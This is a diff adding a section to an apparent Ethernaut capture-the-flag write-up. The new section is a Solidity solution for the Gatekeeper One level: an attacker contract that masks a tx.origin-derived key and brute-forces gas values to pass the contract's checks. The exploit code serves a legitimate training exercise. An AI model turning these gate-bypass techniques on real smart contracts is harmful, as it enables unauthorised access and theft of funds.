@@ -427,3 +427,72 @@ contract PrivacyAttack {
 ```
 Again, we are confronted with the fact that you can't keep any data private when it's stored on the public blockchain (unless of course, you encrypt it) once we understand storage slots, we can more easily grab any value from any contract that we want.
 
+
+
+# 13. [Challenge 13: Gatekeeper One](https://ethernaut.openzeppelin.com/level/0x9b261b23cE149422DE75907C6ac0C30cEc4e652A)
+
+Tasks:
+- Make it past the gatekeeper and register as an entrant to pass this level.
+
+**Solution:** \
+Attack Payload:
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import '@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol';
+
+contract GatekeeperOne {
+
+  using SafeMath for uint256;
+  address public entrant;
+
+  modifier gateOne() {
+    require(msg.sender != tx.origin);
+    _;
+  }
+
+  modifier gateTwo() {
+    require(gasleft().mod(8191) == 0);
+    _;
+  }
+
+  modifier gateThree(bytes8 _gateKey) {
+      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
+      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
+      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
+    _;
+  }
+
+  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+    entrant = tx.origin;
+    return true;
+  }
+}
+
+contract AreYouTheKeymaster{
+    using SafeMath for uint256;
+    bytes8 txOrigin16 = 0x25E73b3f79C43564; //0x3FcB875f56beddC4; //last 16 digits of your account
+    bytes8 public key = txOrigin16 & 0xFFFFFFFF0000FFFF; 
+    GatekeeperOne public gkpOne;
+
+ 
+    constructor(address _addr) public{
+        gkpOne = GatekeeperOne(_addr);
+    }
+
+    function letMeIn() public{
+         for (uint256 i = 0; i < 120; i++) {
+         (bool result, bytes memory data) = address(gkpOne).call{gas:
+          i + 150 + 8191*3}(abi.encodeWithSignature("enter(bytes8)", key)); // thanks to Spalladino https://github.com/OpenZeppelin/ethernaut/blob/solidity-05/contracts/attacks/GatekeeperOneAttack.sol
+      if(result)
+        {
+        break;
+      }
+    }
+  }
+        
+    
+}
+```
+
